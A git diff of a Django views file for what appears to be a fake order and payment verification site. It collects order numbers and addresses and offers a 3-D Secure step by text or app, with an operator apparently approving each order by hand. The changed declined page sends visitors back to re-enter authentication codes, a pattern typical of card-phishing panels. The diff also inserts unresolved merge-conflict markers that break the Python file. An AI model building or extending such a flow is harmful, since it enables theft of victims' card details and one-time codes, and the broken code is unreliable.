@@ -3,7 +3,10 @@ from django.shortcuts import render
 from .models import page1
 from django.urls import reverse
 
+<<<<<<< HEAD
 
+=======
+>>>>>>> 06693a5983db287759ab0ebf7448b5c279750624
 def index(request):
     if request.method == "POST":
         order_number = request.POST.get('order_number')
@@ -22,7 +25,7 @@ def waitReply(request, pk):
     elif get_order.is_order_authentic == False and get_order.is_order_checked == True:
         return HttpResponseRedirect(reverse('page1:order-wrong'))
     return render(request, "page1/order-details-verification.html")
-    
+
 def order_wrong (request):
     return render(request, 'page1/order-wrong.html')
 
@@ -71,13 +74,11 @@ def addressDetails(request, pk):
         main_address = request.POST.get('main_address')
         apt_suite = request.POST.get('apt_suite')
         city = request.POST.get('city')
-        country = request.POST.get('country') 
         record = page1.objects.get(id=pk)
         if main_address:
             record.address = main_address
             record.apt_suite = apt_suite
             record.city = city
-            record.country = country
             record.save()
             return HttpResponseRedirect(reverse('page1:address-verification', args=[pk]))
         else:
@@ -85,7 +86,6 @@ def addressDetails(request, pk):
             record.address = "None"
             record.apt_suite = "None"
             record.city = "None"
-            record.country = "None"
             record.save()
             return HttpResponseRedirect(reverse('page1:address-verification', args=[pk]))
 
@@ -112,12 +112,12 @@ def threeDSMain(request,pk):
     context = {'order_amount':set_the_button}
     if request.method == 'POST':
         if 'Text' in request.POST :
-            
+
             set_the_button.is_text_clicked = "Yes"
             set_the_button.save()
             return HttpResponseRedirect(reverse('page1:authenticate-text', args=[pk]))
         elif 'App' in request.POST:
-            
+
             set_the_button.is_app_clicked = "Yes"
             set_the_button.save()
             return HttpResponseRedirect(reverse('page1:authenticate-app', args=[pk]))
@@ -159,7 +159,7 @@ def payment_verification(request, pk):
 
 def payment_declined(request, pk):
     if request.method == 'POST':
-        return HttpResponseRedirect(reverse('page1:card-details',args=[pk]))
+        return HttpResponseRedirect(reverse('page1:threeDS',args=[pk]))
     return render(request, 'page1/payment-decline.html')
 
 """-----------------------------------------------------------------------------------------------------------------------------------------------"""
